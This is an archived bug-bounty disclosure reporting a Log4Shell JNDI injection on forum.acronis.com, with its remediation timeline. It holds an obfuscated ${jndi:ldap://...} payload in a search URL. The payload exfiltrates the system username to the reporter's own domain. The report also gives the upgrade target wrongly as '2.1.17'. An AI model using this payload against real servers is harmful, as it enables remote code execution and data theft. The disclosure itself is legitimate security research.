---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
  - trigger/auth-required
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2024-08-28
submitted: 2021-12-19T06:07:01.894Z
bounty_usd: null
votes: 74
cve: "CVE-2021-44228"
program: "[[programs/acronis|Acronis]]"
reporter: "godiego"
source: "https://hackerone.com/reports/1430622"
title: "[forum.acronis.com] JNDI Code Injection due an outdated log4j component"
---
# [forum.acronis.com] JNDI Code Injection due an outdated log4j component

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 74 | **Program:** Acronis | **Disclosed:** 2024-08-28

- Report: [https://hackerone.com/reports/1430622](https://hackerone.com/reports/1430622)
- CWE: OS Command Injection | CVE: CVE-2021-44228
- Submitted: 2021-12-19T06:07:01.894Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

Hi team,

It seems that the machine is affected by the latest CVE-2021-44228 which grants any authenticated user command execution. The vulnerability affects the remote asset forum.acronis.com and this issue allows to remote attackers to perfom Remote Code Execution via JNDI exfiltration.

## Steps To Reproduce

Vulnerable request is: `https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}`.

Which generates a pingback exfiltrating the information to my controlled server `ggdd.co.uk`:

{F1551515}

We can see that the system username is `solr`.

## Recommendations

Upgrade Log4j to latest version, 2.1.17.

## Impact

Remote OS command injection via JNDI queries.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2021-12-19** @security-bot: Hi @godiego

Thanks for participating in Acronis bug bounty program!
Our security team usually replies within 1-2 business days.
❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❄️
🎄&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;🦌🦌🦌🦌🦌🦌🦌🦌🦌🛷🎅
Expect longer response times due to winter holidays.

Meanwhile, I'd recommend you to check out our [policy](https://hackerone.com/acronis).
- **Report Needs More Info**
- **Report New**
- **Report Triaged**
- **Bounty Awarded**
- **2022-04-05** @godiego: Thank you team!
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
